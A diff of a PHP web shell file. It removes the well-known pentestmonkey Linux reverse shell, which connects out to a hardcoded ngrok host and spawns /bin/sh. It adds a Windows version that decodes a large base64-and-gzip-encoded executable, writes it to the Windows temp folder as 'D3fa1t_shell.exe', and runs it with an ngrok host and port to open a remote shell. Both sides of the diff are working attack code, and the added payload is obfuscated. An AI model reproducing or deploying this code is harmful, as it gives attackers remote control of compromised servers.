@@ -1,192 +1,22 @@
 <?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-//
-// In all other respects the GPL version 2 applies:
-//
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
-//
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
-// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-//
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
-//
-// Description
-// -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
-//
-// Limitations
-// -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
-//
-// Usage
-// -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '0.tcp.in.ngrok.io';  // CHANGE THIS
-$port = 18400;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
-
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
-if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  // Parent exits
-	}
-
-	// Make the current process a session leader
-	// Will only succeed if we forked
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
-
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-}
-
-// Change to a safe directory
-chdir("/");
-
-// Remove any umask we inherited
-umask(0);
-
-//
-// Do the reverse shell...
-//
-
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
-}
-
-// Spawn shell process
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
-
-$process = proc_open($shell, $descriptorspec, $pipes);
-
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
-}
-
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
-
-printit("Successfully opened reverse shell to $ip:$port");
-
-while (1) {
-	// Check for end of TCP connection
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
-
-	// Check for end of STDOUT
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	// If we can read from the process's STDERR
-	// send data down tcp connection
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?> 
-
-
-
+header('Content-type: text/plain');
+$ip   = "tcp.in.ngrok.io"; //change this 
+$port = "18400"; //change this
+$payload = "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";
+$evalCode = gzinflate(base64_decode($payload));
+$evalArguments = " ".$port." ".$ip;
+$tmpdir ="C:\\windows\\temp";
+chdir($tmpdir);
+$res .= "Using dir : ".$tmpdir;
+$filename = "D3fa1t_shell.exe";
+$file = fopen($filename, 'wb');
+fwrite($file, $evalCode);
+fclose($file);
+$path = $filename;
+$cmd = $path.$evalArguments;
+$res .= "\n\nExecuting : ".$cmd."\n";
+echo $res;
+$output = system($cmd);
+			            
+?>
